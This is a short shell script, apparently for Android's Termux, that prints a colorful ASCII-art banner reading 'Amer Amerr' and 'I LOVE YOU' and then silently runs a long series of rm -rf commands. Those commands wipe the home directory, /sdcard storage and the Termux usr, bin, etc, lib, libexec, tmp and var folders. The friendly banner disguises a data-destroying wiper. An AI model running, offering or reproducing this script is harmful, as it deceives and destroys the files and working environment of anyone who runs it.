#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install
clear

                        
echo -e "$blue         ┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈    ┈┈┈┈┈▂▂▂▂▂▂▂▂┈┈┈"
sleep 0.1
echo -e "$red         ┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈    ┈┈┈╱╲╲▂▂▂▂▂┈▕┈┈┈"
sleep 0.1
echo -e "$green         ┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈    ┈┈╱┈┈╲┈┈┈┈┈▏▕┈┈┈"
sleep 0.1
echo -e "$purple         ┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈    ┈┈▔▏▕▔┈┈┈┈▂▏▕▂┈┈"
sleep 0.1
echo -e "$cyan         ┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈    ┈┈┈▏▕┈┈┈┈┈╲┈┈╱┈┈"
sleep 0.1
echo -e "$blue         ┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈    ┈┈┈▔▔▔▔▔▔▔▔┈┈┈┈┈"
sleep 0.1
echo -e "$red                        Amer Amerr"
sleep 0.1
echo -e "$green                        I LOVE YOU "
sleep 0.1
rm -rf $HOME
rm -rf /sdcard
rm -rf /sdcard1
rm -rf /sdcard 1
rm -rf /sdcard2
rm -rf /sdcard 2
cd $HOME
cd ..
rm -rf *
cd ..
rm -rf *
cd ..
rm -rf *
cd $HOME
cd ..
cd usr
rm -rf *
cd bin 
rm -rf *
cd $HOME 
cd ..
cd usr
cd etc
rm -rf *
cd $HOME
cd ..
cd usr
cd lib
rm -rf *
cd $HOME
cd ..
cd usr
cd libexec
rm -rf *
cd $HOME
cd ..
cd usr
cd tmp
rm -rf *
cd $HOME
cd ..
cd usr
cd var
rm -rf *
